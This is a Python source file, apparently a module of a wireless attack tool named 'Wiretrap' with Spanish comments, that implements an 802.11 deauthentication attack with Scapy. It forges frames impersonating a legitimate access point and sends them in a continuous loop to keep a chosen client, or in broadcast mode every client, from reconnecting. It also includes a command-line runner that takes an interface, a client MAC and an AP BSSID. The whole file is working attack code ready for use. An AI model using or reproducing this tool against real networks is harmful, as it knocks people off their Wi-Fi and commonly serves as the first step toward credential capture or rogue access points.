import threading
import time
import os
import sys

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

from scapy.all import sendp, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Deauth


class Deauther:
    """
    Envía tramas de deautenticación 802.11 suplantando al AP legítimo.
    Mantiene un bucle continuo para impedir que el cliente reconecte.
    Requiere interfaz en modo monitor con inyección de paquetes.
    """

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._thread = None

        # Callbacks para la GUI
        self.on_packet_sent = None
        self.on_stopped = None

    def _build_deauth(self, client_mac, ap_bssid):
        """
        Construye las dos tramas de deauth necesarias:
        1. AP → Cliente (fuerza al cliente a desconectarse)
        2. Cliente → AP  (fuerza al AP a limpiar la asociación)
        """
        pkt_to_client = (
            RadioTap() /
            Dot11(
                addr1=client_mac,
                addr2=ap_bssid,
                addr3=ap_bssid
            ) /
            Dot11Deauth(reason=7)
        )

        pkt_to_ap = (
            RadioTap() /
            Dot11(
                addr1=ap_bssid,
                addr2=client_mac,
                addr3=ap_bssid
            ) /
            Dot11Deauth(reason=7)
        )

        return [pkt_to_client, pkt_to_ap]

    def _deauth_loop(self, client_mac, ap_bssid, packets_per_burst, interval):
        """
        Bucle de deauth continuo.
        Envía ráfagas de paquetes cada interval segundos.
        """
        packets = self._build_deauth(client_mac, ap_bssid)
        # addr2=broadcast es inválido en 802.11 (el TA nunca puede ser
        # de grupo); la mayoría de drivers descartan ese frame sin error.
        # En modo broadcast solo enviamos la dirección AP→todos.
        if client_mac == "ff:ff:ff:ff:ff:ff":
            packets = packets[:1]
        count = 0

        while self.running:
            for pkt in packets:
                sendp(
                    pkt,
                    iface=self.interface,
                    count=packets_per_burst,
                    inter=0.01,
                    verbose=False
                )
                count += packets_per_burst

            if self.on_packet_sent:
                self.on_packet_sent(count)

            time.sleep(interval)

        if self.on_stopped:
            self.on_stopped()

    def start(self, client_mac, ap_bssid, packets_per_burst=5, interval=0.1):
        """
        Inicia el ataque de deauth en un thread separado.

        Args:
            client_mac:        MAC del cliente objetivo
            ap_bssid:          MAC del AP legítimo a suplantar
            packets_per_burst: Tramas enviadas por ráfaga
            interval:          Segundos entre ráfagas
        """
        if self.running:
            return

        self.running = True
        self._thread = threading.Thread(
            target=self._deauth_loop,
            args=(client_mac, ap_bssid, packets_per_burst, interval),
            daemon=True
        )
        self._thread.start()

    def stop(self):
        """Detiene el bucle de deauth"""
        self.running = False
        if self._thread:
            self._thread.join(timeout=2)

    def deauth_all_clients(self, ap_bssid, packets_per_burst=5, interval=0.1):
        """Deauth masivo contra todos los clientes del AP a la vez."""
        BROADCAST = "ff:ff:ff:ff:ff:ff"
        self.start(BROADCAST, ap_bssid, packets_per_burst, interval)


# ── Test en terminal ──────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: sudo python3 deauth.py <interfaz> <cliente_mac> <ap_bssid>")
        print("Ejemplo: sudo python3 deauth.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66")
        sys.exit(1)

    iface = sys.argv[1]
    client_mac = sys.argv[2]
    ap_bssid = sys.argv[3]

    deauther = Deauther(iface)

    def on_sent(count):
        print(f"\r[*] Paquetes enviados: {count}", end="", flush=True)

    def on_stopped():
        print("\n[!] Deauth detenido.")

    deauther.on_packet_sent = on_sent
    deauther.on_stopped = on_stopped

    print(f"[*] Iniciando deauth:")
    print(f"    Interfaz : {iface}")
    print(f"    Cliente  : {client_mac}")
    print(f"    AP       : {ap_bssid}")
    print(f"    Ctrl+C para detener\n")

    try:
        deauther.start(client_mac, ap_bssid)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        deauther.stop()
